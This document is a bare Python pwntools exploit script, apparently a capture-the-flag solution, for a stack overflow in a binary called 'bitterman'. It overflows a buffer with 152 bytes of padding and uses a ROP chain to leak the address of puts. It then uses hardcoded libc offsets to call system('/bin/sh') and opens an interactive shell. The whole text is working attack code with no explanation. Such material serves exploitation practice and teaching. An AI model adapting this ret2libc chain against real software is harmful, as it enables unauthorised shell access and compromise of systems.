from pwn import *

#context(terminal=['tmux','new-windows'])
libc = ELF('./libc.so.6')
bin = ELF('./bitterman')
p = process('./bitterman')
#p = gdb.debug('./bitterman','b main')
context(os='linux',arch='amd64')

put_plt = p64(bin.plt['puts'])
put_got = p64(bin.got['puts'])
pop_rdi = p64(bin.search(asm('pop rdi;ret')).next())
padding = "A"*152
main = p64(0x4006ec)
payload = padding+pop_rdi+put_got+put_plt+main


p.recvuntil('name?')
p.sendline('ippsec')
p.recvuntil('message:')
p.sendline('512')
p.recvuntil('text:')
p.sendline(payload)
p.recvuntil('Thanks!')
p.recvline()
leak = p.recvline()
leak =  u64(leak[0:8].strip().ljust(8,"\x00"))
print leak


# stage 2 exploit

lba = leak - libc.symbols['puts']
system =p64(lba + 0x449c0)
bin_sh = p64(lba + 0x181519)
pop_rdi = bin.search(asm('pop rdi;ret')).next()

payload = padding + p64(pop_rdi) + bin_sh + system

p.recvuntil('name?')
p.sendline('ippsec')
p.recvuntil('message:')
p.sendline('512')
p.recvuntil('text:')
p.sendline(payload)
p.interactive()
